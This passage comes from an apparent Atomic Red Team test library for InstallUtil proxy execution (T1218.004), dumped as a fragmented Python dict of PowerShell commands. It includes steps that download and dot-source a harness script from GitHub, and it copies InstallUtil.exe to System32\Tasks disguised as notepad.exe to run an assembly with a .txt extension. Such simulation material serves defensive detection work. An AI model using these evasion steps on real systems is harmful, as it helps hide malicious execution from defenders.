                                                                                                                  '\n'
                                                                                                                  '$CommandLine '
                                                                                                                  '= '
                                                                                                                  '"/logfile= '
                                                                                                                  '/logtoconsole=false '
                                                                                                                  '/installtype=notransaction '
                                                                                                                  '/action=install '
                                                                                                                  '`"$InstallerAssemblyFullPath`""\n'
                                                                                                                  '$ExpectedOutput '
                                                                                                                  '= '
                                                                                                                  "'Constructor_Install_'\n"
                                                                                                                  '\n'
                                                                                                                  '$TestArgs '
                                                                                                                  '= '
                                                                                                                  '@{\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyDirectory '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyDir\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '    '
                                                                                                                  'InvocationMethod '
                                                                                                                  '= '
                                                                                                                  "'#{invocation_method}'\n"
                                                                                                                  '    '
                                                                                                                  'CommandLine '
                                                                                                                  '= '
                                                                                                                  '$CommandLine\n'
                                                                                                                  '}\n'
                                                                                                                  '\n'
                                                                                                                  '$ActualOutput '
                                                                                                                  '= '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly '
                                                                                                                  '@TestArgs\n'
                                                                                                                  '\n'
                                                                                                                  'if '
                                                                                                                  '($ActualOutput '
                                                                                                                  '-ne '
                                                                                                                  '$ExpectedOutput) '
                                                                                                                  '{\n'
                                                                                                                  '    '
                                                                                                                  'throw '
                                                                                                                  '@"\n'
                                                                                                                  'InstallUtil '
                                                                                                                  'Install '
                                                                                                                  'method '
                                                                                                                  'execution '
                                                                                                                  'test '
                                                                                                                  'failure. '
                                                                                                                  'Installer '
                                                                                                                  'assembly '
                                                                                                                  'execution '
                                                                                                                  'output '
                                                                                                                  'did '
                                                                                                                  'not '
                                                                                                                  'match '
                                                                                                                  'the '
                                                                                                                  'expected '
                                                                                                                  'output.\n'
                                                                                                                  'Expected: '
                                                                                                                  '$ExpectedOutput\n'
                                                                                                                  'Actual: '
                                                                                                                  '$ActualOutput\n'
                                                                                                                  '"@\n'
                                                                                                                  '}\n',
                                                                                                       'name': 'powershell'},
                                                                                          'input_arguments': {'assembly_dir': {'default': '$Env:TEMP\\',
                                                                                                                               'description': 'directory '
                                                                                                                                              'to '
                                                                                                                                              'drop '
                                                                                                                                              'the '
                                                                                                                                              'compiled '
                                                                                                                                              'installer '
                                                                                                                                              'assembly',
                                                                                                                               'type': 'Path'},
                                                                                                              'assembly_filename': {'default': 'T1218.004.dll',
                                                                                                                                    'description': 'filename '
                                                                                                                                                   'of '
                                                                                                                                                   'the '
                                                                                                                                                   'compiled '
                                                                                                                                                   'installer '
                                                                                                                                                   'assembly',
                                                                                                                                    'type': 'String'},
                                                                                                              'invocation_method': {'default': 'Executable',
                                                                                                                                    'description': 'the '
                                                                                                                                                   'type '
                                                                                                                                                   'of '
                                                                                                                                                   'InstallUtil '
                                                                                                                                                   'invocation '
                                                                                                                                                   'variant '
                                                                                                                                                   '- '
                                                                                                                                                   'Executable, '
                                                                                                                                                   'InstallHelper, '
                                                                                                                                                   'or '
                                                                                                                                                   'CheckIfInstallable',
                                                                                                                                    'type': 'String'},
                                                                                                              'test_harness': {'default': 'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1',
                                                                                                                               'description': 'location '
                                                                                                                                              'of '
                                                                                                                                              'the '
                                                                                                                                              'test '
                                                                                                                                              'harness '
                                                                                                                                              'script '
                                                                                                                                              '- '
                                                                                                                                              'Invoke-BuildAndInvokeInstallUtilAssembly',
                                                                                                                               'type': 'Path'}},
                                                                                          'name': 'InstallUtil '
                                                                                                  'Install '
                                                                                                  'method '
                                                                                                  'call',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': '34428cfa-8e38-41e5-aff4-9e1f8f3a7b4b',
                                                                                          'dependencies': [{'description': 'InstallUtil '
                                                                                                                           'test '
                                                                                                                           'harness '
                                                                                                                           'script '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'installed '
                                                                                                                           'at '
                                                                                                                           'specified '
                                                                                                                           'location '
                                                                                                                           '(#{test_harness})\n',
                                                                                                            'get_prereq_command': 'New-Item '
                                                                                                                                  '-Type '
                                                                                                                                  'Directory '
                                                                                                                                  '(split-path '
                                                                                                                                  '#{test_harness}) '
                                                                                                                                  '-ErrorAction '
                                                                                                                                  'ignore '
                                                                                                                                  '| '
                                                                                                                                  'Out-Null\n'
                                                                                                                                  'Invoke-WebRequest '
                                                                                                                                  "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                                                                                                                                  '-OutFile '
                                                                                                                                  '"#{test_harness}"\n',
                                                                                                            'prereq_command': 'if '
                                                                                                                              '(Test-Path '
                                                                                                                              '"#{test_harness}") '
                                                                                                                              '{exit '
                                                                                                                              '0} '
                                                                                                                              'else '
                                                                                                                              '{exit '
                                                                                                                              '1}\n'}],
                                                                                          'description': 'Executes '
                                                                                                         'the '
                                                                                                         'Uninstall '
                                                                                                         'Method. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'version '
                                                                                                         'information '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed '
                                                                                                         'the '
                                                                                                         '.NET '
                                                                                                         'framework '
                                                                                                         'install '
                                                                                                         'utility.\n',
                                                                                          'executor': {'cleanup_command': '$InstallerAssemblyDir '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_dir}"\n'
                                                                                                                          '$InstallerAssemblyFileName '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_filename}"\n'
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '= '
                                                                                                                          'Join-Path '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyDir '
                                                                                                                          '-ChildPath '
                                                                                                                          '$InstallerAssemblyFileName\n'
                                                                                                                          'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n',
                                                                                                       'command': '# '
                                                                                                                  'Import '
                                                                                                                  'the '
                                                                                                                  'required '
                                                                                                                  'test '
                                                                                                                  'harness '
                                                                                                                  'function, '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly\n'
                                                                                                                  '. '
                                                                                                                  '#{test_harness}\n'
                                                                                                                  '\n'
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_dir}"\n'
                                                                                                                  '$InstallerAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_filename}"\n'
                                                                                                                  '$InstallerAssemblyFullPath '
                                                                                                                  '= '
                                                                                                                  'Join-Path '
                                                                                                                  '-Path '
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '-ChildPath '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '\n'
                                                                                                                  '$CommandLine '
                                                                                                                  '= '
                                                                                                                  '"/logfile= '
                                                                                                                  '/logtoconsole=false '
                                                                                                                  '/U '
                                                                                                                  '`"$InstallerAssemblyFullPath`""\n'
                                                                                                                  '$ExpectedOutput '
                                                                                                                  '= '
                                                                                                                  "'Constructor_Uninstall_'\n"
                                                                                                                  '\n'
                                                                                                                  '$TestArgs '
                                                                                                                  '= '
                                                                                                                  '@{\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyDirectory '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyDir\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '    '
                                                                                                                  'InvocationMethod '
                                                                                                                  '= '
                                                                                                                  "'#{invocation_method}'\n"
                                                                                                                  '    '
                                                                                                                  'CommandLine '
                                                                                                                  '= '
                                                                                                                  '$CommandLine\n'
                                                                                                                  '}\n'
                                                                                                                  '\n'
                                                                                                                  '$ActualOutput '
                                                                                                                  '= '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly '
                                                                                                                  '@TestArgs\n'
                                                                                                                  '\n'
                                                                                                                  'if '
                                                                                                                  '($ActualOutput '
                                                                                                                  '-ne '
                                                                                                                  '$ExpectedOutput) '
                                                                                                                  '{\n'
                                                                                                                  '    '
                                                                                                                  'throw '
                                                                                                                  '@"\n'
                                                                                                                  'InstallUtil '
                                                                                                                  'Uninstall '
                                                                                                                  'method '
                                                                                                                  'execution '
                                                                                                                  'test '
                                                                                                                  'failure. '
                                                                                                                  'Installer '
                                                                                                                  'assembly '
                                                                                                                  'execution '
                                                                                                                  'output '
                                                                                                                  'did '
                                                                                                                  'not '
                                                                                                                  'match '
                                                                                                                  'the '
                                                                                                                  'expected '
                                                                                                                  'output.\n'
                                                                                                                  'Expected: '
                                                                                                                  '$ExpectedOutput\n'
                                                                                                                  'Actual: '
                                                                                                                  '$ActualOutput\n'
                                                                                                                  '"@\n'
                                                                                                                  '}\n',
                                                                                                       'name': 'powershell'},
                                                                                          'input_arguments': {'assembly_dir': {'default': '$Env:TEMP\\',
                                                                                                                               'description': 'directory '
                                                                                                                                              'to '
                                                                                                                                              'drop '
                                                                                                                                              'the '
                                                                                                                                              'compiled '
                                                                                                                                              'installer '
                                                                                                                                              'assembly',
                                                                                                                               'type': 'Path'},
                                                                                                              'assembly_filename': {'default': 'T1218.004.dll',
                                                                                                                                    'description': 'filename '
                                                                                                                                                   'of '
                                                                                                                                                   'the '
                                                                                                                                                   'compiled '
                                                                                                                                                   'installer '
                                                                                                                                                   'assembly',
                                                                                                                                    'type': 'String'},
                                                                                                              'invocation_method': {'default': 'Executable',
                                                                                                                                    'description': 'the '
                                                                                                                                                   'type '
                                                                                                                                                   'of '
                                                                                                                                                   'InstallUtil '
                                                                                                                                                   'invocation '
                                                                                                                                                   'variant '
                                                                                                                                                   '- '
                                                                                                                                                   'Executable, '
                                                                                                                                                   'InstallHelper, '
                                                                                                                                                   'or '
                                                                                                                                                   'CheckIfInstallable',
                                                                                                                                    'type': 'String'},
                                                                                                              'test_harness': {'default': 'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1',
                                                                                                                               'description': 'location '
                                                                                                                                              'of '
                                                                                                                                              'the '
                                                                                                                                              'test '
                                                                                                                                              'harness '
                                                                                                                                              'script '
                                                                                                                                              '- '
                                                                                                                                              'Invoke-BuildAndInvokeInstallUtilAssembly',
                                                                                                                               'type': 'Path'}},
                                                                                          'name': 'InstallUtil '
                                                                                                  'Uninstall '
                                                                                                  'method '
                                                                                                  'call '
                                                                                                  '- '
                                                                                                  '/U '
                                                                                                  'variant',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': '06d9deba-f732-48a8-af8e-bdd6e4d98c1d',
                                                                                          'dependencies': [{'description': 'InstallUtil '
                                                                                                                           'test '
                                                                                                                           'harness '
                                                                                                                           'script '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'installed '
                                                                                                                           'at '
                                                                                                                           'specified '
                                                                                                                           'location '
                                                                                                                           '(#{test_harness})\n',
                                                                                                            'get_prereq_command': 'New-Item '
                                                                                                                                  '-Type '
                                                                                                                                  'Directory '
                                                                                                                                  '(split-path '
                                                                                                                                  '#{test_harness}) '
                                                                                                                                  '-ErrorAction '
                                                                                                                                  'ignore '
                                                                                                                                  '| '
                                                                                                                                  'Out-Null\n'
                                                                                                                                  'Invoke-WebRequest '
                                                                                                                                  "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                                                                                                                                  '-OutFile '
                                                                                                                                  '"#{test_harness}"\n',
                                                                                                            'prereq_command': 'if '
                                                                                                                              '(Test-Path '
                                                                                                                              '"#{test_harness}") '
                                                                                                                              '{exit '
                                                                                                                              '0} '
                                                                                                                              'else '
                                                                                                                              '{exit '
                                                                                                                              '1}\n'}],
                                                                                          'description': 'Executes '
                                                                                                         'the '
                                                                                                         'Uninstall '
                                                                                                         'Method. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'version '
                                                                                                         'information '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed '
                                                                                                         'the '
                                                                                                         '.NET '
                                                                                                         'framework '
                                                                                                         'install '
                                                                                                         'utility.\n',
                                                                                          'executor': {'cleanup_command': '$InstallerAssemblyDir '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_dir}"\n'
                                                                                                                          '$InstallerAssemblyFileName '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_filename}"\n'
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '= '
                                                                                                                          'Join-Path '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyDir '
                                                                                                                          '-ChildPath '
                                                                                                                          '$InstallerAssemblyFileName\n'
                                                                                                                          'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n',
                                                                                                       'command': '# '
                                                                                                                  'Import '
                                                                                                                  'the '
                                                                                                                  'required '
                                                                                                                  'test '
                                                                                                                  'harness '
                                                                                                                  'function, '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly\n'
                                                                                                                  '. '
                                                                                                                  '#{test_harness}\n'
                                                                                                                  '\n'
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_dir}"\n'
                                                                                                                  '$InstallerAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_filename}"\n'
                                                                                                                  '$InstallerAssemblyFullPath '
                                                                                                                  '= '
                                                                                                                  'Join-Path '
                                                                                                                  '-Path '
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '-ChildPath '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '\n'
                                                                                                                  '$CommandLine '
                                                                                                                  '= '
                                                                                                                  '"/logfile= '
                                                                                                                  '/logtoconsole=false '
                                                                                                                  '/installtype=notransaction '
                                                                                                                  '/action=uninstall '
                                                                                                                  '`"$InstallerAssemblyFullPath`""\n'
                                                                                                                  '$ExpectedOutput '
                                                                                                                  '= '
                                                                                                                  "'Constructor_Uninstall_'\n"
                                                                                                                  '\n'
                                                                                                                  '$TestArgs '
                                                                                                                  '= '
                                                                                                                  '@{\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyDirectory '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyDir\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '    '
                                                                                                                  'InvocationMethod '
                                                                                                                  '= '
                                                                                                                  "'#{invocation_method}'\n"
                                                                                                                  '    '
                                                                                                                  'CommandLine '
                                                                                                                  '= '
                                                                                                                  '$CommandLine\n'
                                                                                                                  '}\n'
                                                                                                                  '\n'
                                                                                                                  '$ActualOutput '
                                                                                                                  '= '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly '
                                                                                                                  '@TestArgs\n'
                                                                                                                  '\n'
                                                                                                                  'if '
                                                                                                                  '($ActualOutput '
                                                                                                                  '-ne '
                                                                                                                  '$ExpectedOutput) '
                                                                                                                  '{\n'
                                                                                                                  '    '
                                                                                                                  'throw '
                                                                                                                  '@"\n'
                                                                                                                  'InstallUtil '
                                                                                                                  'Uninstall '
                                                                                                                  'method '
                                                                                                                  'execution '
                                                                                                                  'test '
                                                                                                                  'failure. '
                                                                                                                  'Installer '
                                                                                                                  'assembly '
                                                                                                                  'execution '
                                                                                                                  'output '
                                                                                                                  'did '
                                                                                                                  'not '
                                                                                                                  'match '
                                                                                                                  'the '
                                                                                                                  'expected '
                                                                                                                  'output.\n'
                                                                                                                  'Expected: '
                                                                                                                  '$ExpectedOutput\n'
                                                                                                                  'Actual: '
                                                                                                                  '$ActualOutput\n'
                                                                                                                  '"@\n'
                                                                                                                  '}\n',
                                                                                                       'name': 'powershell'},
                                                                                          'input_arguments': {'assembly_dir': {'default': '$Env:TEMP\\',
                                                                                                                               'description': 'directory '
                                                                                                                                              'to '
                                                                                                                                              'drop '
                                                                                                                                              'the '
                                                                                                                                              'compiled '
                                                                                                                                              'installer '
                                                                                                                                              'assembly',
                                                                                                                               'type': 'Path'},
                                                                                                              'assembly_filename': {'default': 'T1218.004.dll',
                                                                                                                                    'description': 'filename '
                                                                                                                                                   'of '
                                                                                                                                                   'the '
                                                                                                                                                   'compiled '
                                                                                                                                                   'installer '
                                                                                                                                                   'assembly',
                                                                                                                                    'type': 'String'},
                                                                                                              'invocation_method': {'default': 'Executable',
                                                                                                                                    'description': 'the '
                                                                                                                                                   'type '
                                                                                                                                                   'of '
                                                                                                                                                   'InstallUtil '
                                                                                                                                                   'invocation '
                                                                                                                                                   'variant '
                                                                                                                                                   '- '
                                                                                                                                                   'Executable, '
                                                                                                                                                   'InstallHelper, '
                                                                                                                                                   'or '
                                                                                                                                                   'CheckIfInstallable',
                                                                                                                                    'type': 'String'},
                                                                                                              'test_harness': {'default': 'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1',
                                                                                                                               'description': 'location '
                                                                                                                                              'of '
                                                                                                                                              'the '
                                                                                                                                              'test '
                                                                                                                                              'harness '
                                                                                                                                              'script '
                                                                                                                                              '- '
                                                                                                                                              'Invoke-BuildAndInvokeInstallUtilAssembly',
                                                                                                                               'type': 'Path'}},
                                                                                          'name': 'InstallUtil '
                                                                                                  'Uninstall '
                                                                                                  'method '
                                                                                                  'call '
                                                                                                  '- '
                                                                                                  "'/installtype=notransaction "
                                                                                                  "/action=uninstall' "
                                                                                                  'variant',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': '5a683850-1145-4326-a0e5-e91ced3c6022',
                                                                                          'dependencies': [{'description': 'InstallUtil '
                                                                                                                           'test '
                                                                                                                           'harness '
                                                                                                                           'script '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'installed '
                                                                                                                           'at '
                                                                                                                           'specified '
                                                                                                                           'location '
                                                                                                                           '(#{test_harness})\n',
                                                                                                            'get_prereq_command': 'New-Item '
                                                                                                                                  '-Type '
                                                                                                                                  'Directory '
                                                                                                                                  '(split-path '
                                                                                                                                  '#{test_harness}) '
                                                                                                                                  '-ErrorAction '
                                                                                                                                  'ignore '
                                                                                                                                  '| '
                                                                                                                                  'Out-Null\n'
                                                                                                                                  'Invoke-WebRequest '
                                                                                                                                  "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                                                                                                                                  '-OutFile '
                                                                                                                                  '"#{test_harness}"\n',
                                                                                                            'prereq_command': 'if '
                                                                                                                              '(Test-Path '
                                                                                                                              '"#{test_harness}") '
                                                                                                                              '{exit '
                                                                                                                              '0} '
                                                                                                                              'else '
                                                                                                                              '{exit '
                                                                                                                              '1}\n'}],
                                                                                          'description': 'Executes '
                                                                                                         'the '
                                                                                                         'Uninstall '
                                                                                                         'Method. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         'help '
                                                                                                         'information '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed '
                                                                                                         'for '
                                                                                                         'InstallUtil.\n',
                                                                                          'executor': {'cleanup_command': '$InstallerAssemblyDir '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_dir}"\n'
                                                                                                                          '$InstallerAssemblyFileName '
                                                                                                                          '= '
                                                                                                                          '"#{assembly_filename}"\n'
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '= '
                                                                                                                          'Join-Path '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyDir '
                                                                                                                          '-ChildPath '
                                                                                                                          '$InstallerAssemblyFileName\n'
                                                                                                                          'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '$InstallerAssemblyFullPath '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n',
                                                                                                       'command': '# '
                                                                                                                  'Import '
                                                                                                                  'the '
                                                                                                                  'required '
                                                                                                                  'test '
                                                                                                                  'harness '
                                                                                                                  'function, '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly\n'
                                                                                                                  '. '
                                                                                                                  '#{test_harness}\n'
                                                                                                                  '\n'
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_dir}"\n'
                                                                                                                  '$InstallerAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '"#{assembly_filename}"\n'
                                                                                                                  '$InstallerAssemblyFullPath '
                                                                                                                  '= '
                                                                                                                  'Join-Path '
                                                                                                                  '-Path '
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '-ChildPath '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '\n'
                                                                                                                  '$CommandLine '
                                                                                                                  '= '
                                                                                                                  '"/? '
                                                                                                                  '`"$InstallerAssemblyFullPath`""\n'
                                                                                                                  '$ExpectedOutput '
                                                                                                                  '= '
                                                                                                                  "'Constructor_HelpText_'\n"
                                                                                                                  '\n'
                                                                                                                  '$TestArgs '
                                                                                                                  '= '
                                                                                                                  '@{\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyDirectory '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyDir\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '    '
                                                                                                                  'InvocationMethod '
                                                                                                                  '= '
                                                                                                                  "'#{invocation_method}'\n"
                                                                                                                  '    '
                                                                                                                  'CommandLine '
                                                                                                                  '= '
                                                                                                                  '$CommandLine\n'
                                                                                                                  '}\n'
                                                                                                                  '\n'
                                                                                                                  '$ActualOutput '
                                                                                                                  '= '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly '
                                                                                                                  '@TestArgs\n'
                                                                                                                  '\n'
                                                                                                                  'if '
                                                                                                                  '($ActualOutput '
                                                                                                                  '-ne '
                                                                                                                  '$ExpectedOutput) '
                                                                                                                  '{\n'
                                                                                                                  '    '
                                                                                                                  'throw '
                                                                                                                  '@"\n'
                                                                                                                  'InstallUtil '
                                                                                                                  'HelpText '
                                                                                                                  'property '
                                                                                                                  'execution '
                                                                                                                  'test '
                                                                                                                  'failure. '
                                                                                                                  'Installer '
                                                                                                                  'assembly '
                                                                                                                  'execution '
                                                                                                                  'output '
                                                                                                                  'did '
                                                                                                                  'not '
                                                                                                                  'match '
                                                                                                                  'the '
                                                                                                                  'expected '
                                                                                                                  'output.\n'
                                                                                                                  'Expected: '
                                                                                                                  '$ExpectedOutput\n'
                                                                                                                  'Actual: '
                                                                                                                  '$ActualOutput\n'
                                                                                                                  '"@\n'
                                                                                                                  '}\n',
                                                                                                       'name': 'powershell'},
                                                                                          'input_arguments': {'assembly_dir': {'default': '$Env:TEMP\\',
                                                                                                                               'description': 'directory '
                                                                                                                                              'to '
                                                                                                                                              'drop '
                                                                                                                                              'the '
                                                                                                                                              'compiled '
                                                                                                                                              'installer '
                                                                                                                                              'assembly',
                                                                                                                               'type': 'Path'},
                                                                                                              'assembly_filename': {'default': 'T1218.004.dll',
                                                                                                                                    'description': 'filename '
                                                                                                                                                   'of '
                                                                                                                                                   'the '
                                                                                                                                                   'compiled '
                                                                                                                                                   'installer '
                                                                                                                                                   'assembly',
                                                                                                                                    'type': 'String'},
                                                                                                              'invocation_method': {'default': 'Executable',
                                                                                                                                    'description': 'the '
                                                                                                                                                   'type '
                                                                                                                                                   'of '
                                                                                                                                                   'InstallUtil '
                                                                                                                                                   'invocation '
                                                                                                                                                   'variant '
                                                                                                                                                   '- '
                                                                                                                                                   'Executable, '
                                                                                                                                                   'InstallHelper, '
                                                                                                                                                   'or '
                                                                                                                                                   'CheckIfInstallable',
                                                                                                                                    'type': 'String'},
                                                                                                              'test_harness': {'default': 'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1',
                                                                                                                               'description': 'location '
                                                                                                                                              'of '
                                                                                                                                              'the '
                                                                                                                                              'test '
                                                                                                                                              'harness '
                                                                                                                                              'script '
                                                                                                                                              '- '
                                                                                                                                              'Invoke-BuildAndInvokeInstallUtilAssembly',
                                                                                                                               'type': 'Path'}},
                                                                                          'name': 'InstallUtil '
                                                                                                  'HelpText '
                                                                                                  'method '
                                                                                                  'call',
                                                                                          'supported_platforms': ['windows']},
                                                                                         {'auto_generated_guid': '559e6d06-bb42-4307-bff7-3b95a8254bad',
                                                                                          'dependencies': [{'description': 'InstallUtil '
                                                                                                                           'test '
                                                                                                                           'harness '
                                                                                                                           'script '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'installed '
                                                                                                                           'at '
                                                                                                                           'specified '
                                                                                                                           'location '
                                                                                                                           '(#{test_harness})\n',
                                                                                                            'get_prereq_command': 'New-Item '
                                                                                                                                  '-Type '
                                                                                                                                  'Directory '
                                                                                                                                  '(split-path '
                                                                                                                                  '#{test_harness}) '
                                                                                                                                  '-ErrorAction '
                                                                                                                                  'ignore '
                                                                                                                                  '| '
                                                                                                                                  'Out-Null\n'
                                                                                                                                  'Invoke-WebRequest '
                                                                                                                                  "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                                                                                                                                  '-OutFile '
                                                                                                                                  '"#{test_harness}"\n',
                                                                                                            'prereq_command': 'if '
                                                                                                                              '(Test-Path '
                                                                                                                              '"#{test_harness}") '
                                                                                                                              '{exit '
                                                                                                                              '0} '
                                                                                                                              'else '
                                                                                                                              '{exit '
                                                                                                                              '1}\n'}],
                                                                                          'description': 'Executes '
                                                                                                         'an '
                                                                                                         'InstallUtil '
                                                                                                         'assembly '
                                                                                                         'by '
                                                                                                         'renaming '
                                                                                                         'InstallUtil.exe '
                                                                                                         'and '
                                                                                                         'using '
                                                                                                         'a '
                                                                                                         'nonstandard '
                                                                                                         'extension '
                                                                                                         'for '
                                                                                                         'the '
                                                                                                         'assembly. '
                                                                                                         'Upon '
                                                                                                         'execution, '
                                                                                                         '"Running '
                                                                                                         'a '
                                                                                                         'transacted '
                                                                                                         'installation."\n'
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed, '
                                                                                                         'along '
                                                                                                         'with '
                                                                                                         'other '
                                                                                                         'information '
                                                                                                         'about '
                                                                                                         'the '
                                                                                                         'opperation. '
                                                                                                         '"The '
                                                                                                         'transacted '
                                                                                                         'install '
                                                                                                         'has '
                                                                                                         'completed." '
                                                                                                         'will '
                                                                                                         'be '
                                                                                                         'displayed '
                                                                                                         'upon '
                                                                                                         'completion.\n',
                                                                                          'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '"$Env:windir\\System32\\Tasks\\readme.txt" '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n'
                                                                                                                          'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '"$Env:windir\\System32\\Tasks\\readme.InstallLog" '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n'
                                                                                                                          'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '"$Env:windir\\System32\\Tasks\\readme.InstallState" '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n'
                                                                                                                          'Remove-Item '
                                                                                                                          '-Path '
                                                                                                                          '"$Env:windir\\System32\\Tasks\\notepad.exe" '
                                                                                                                          '-ErrorAction '
                                                                                                                          'Ignore\n',
                                                                                                       'command': '# '
                                                                                                                  'Import '
                                                                                                                  'the '
                                                                                                                  'required '
                                                                                                                  'test '
                                                                                                                  'harness '
                                                                                                                  'function, '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly\n'
                                                                                                                  '. '
                                                                                                                  '#{test_harness}\n'
                                                                                                                  '\n'
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '= '
                                                                                                                  '"$Env:windir\\System32\\Tasks"\n'
                                                                                                                  '$InstallerAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  "'readme.txt'\n"
                                                                                                                  '$InstallerAssemblyFullPath '
                                                                                                                  '= '
                                                                                                                  'Join-Path '
                                                                                                                  '-Path '
                                                                                                                  '$InstallerAssemblyDir '
                                                                                                                  '-ChildPath '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '\n'
                                                                                                                  '$CommandLine '
                                                                                                                  '= '
                                                                                                                  '"readme.txt"\n'
                                                                                                                  '$ExpectedOutput '
                                                                                                                  '= '
                                                                                                                  "'Constructor_'\n"
                                                                                                                  '\n'
                                                                                                                  '# '
                                                                                                                  'Explicitly '
                                                                                                                  'set '
                                                                                                                  'the '
                                                                                                                  'directory '
                                                                                                                  'so '
                                                                                                                  'that '
                                                                                                                  'a '
                                                                                                                  'relative '
                                                                                                                  'path '
                                                                                                                  'to '
                                                                                                                  'readme.txt '
                                                                                                                  'can '
                                                                                                                  'be '
                                                                                                                  'supplied.\n'
                                                                                                                  'Set-Location '
                                                                                                                  '"$Env:windir\\System32\\Tasks"\n'
                                                                                                                  '\n'
                                                                                                                  'Copy-Item '
                                                                                                                  '-Path '
                                                                                                                  '"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" '
                                                                                                                  '-Destination '
                                                                                                                  '"$Env:windir\\System32\\Tasks\\notepad.exe"\n'
                                                                                                                  '\n'
                                                                                                                  '$TestArgs '
                                                                                                                  '= '
                                                                                                                  '@{\n'
                                                                                                                  '    '
